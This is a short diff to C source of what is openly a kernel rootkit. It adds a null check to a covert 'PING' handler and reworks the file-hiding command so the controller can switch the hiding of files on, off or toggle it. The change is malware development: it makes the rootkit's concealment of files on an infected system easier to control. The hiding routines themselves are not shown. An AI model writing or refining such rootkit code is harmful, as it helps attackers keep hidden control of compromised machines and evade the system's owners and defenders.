@@ -39,6 +39,9 @@ detect_channel(unsigned cmd)
 int
 handle_ping(unsigned long arg)
 {
+    if (!(const char *)arg)
+        return -ENOTTY;
+
     copy_from_user(buf, (const char *)arg, BUFLEN);
     if (!strcmp("PING", buf)) {
         buf[1] = 'O';
@@ -51,14 +54,19 @@ handle_ping(unsigned long arg)
 int
 handle_filehide(unsigned long arg)
 {
-    bool set;
+    long sarg = (long)arg;
+    bool set = rootkit.hiding_files;
 
-    if ((set = rootkit.hiding_files ^= 1))
+    if (sarg > 0 || !sarg && (set ^ 1)) {
         hide_files();
-    else
+        rootkit.hiding_files = 1;
+    } else if (sarg < 0 || !sarg && !(set ^ 1)) {
         unhide_files();
+        rootkit.hiding_files = 0;
+    }
 
-    DEBUG_NOTICE("filehide toggled %s", set ? "on" : "off");
+    DEBUG_NOTICE("filehide toggled %s",
+            rootkit.hiding_files ? "on" : "off");
 
     return 0;
 }
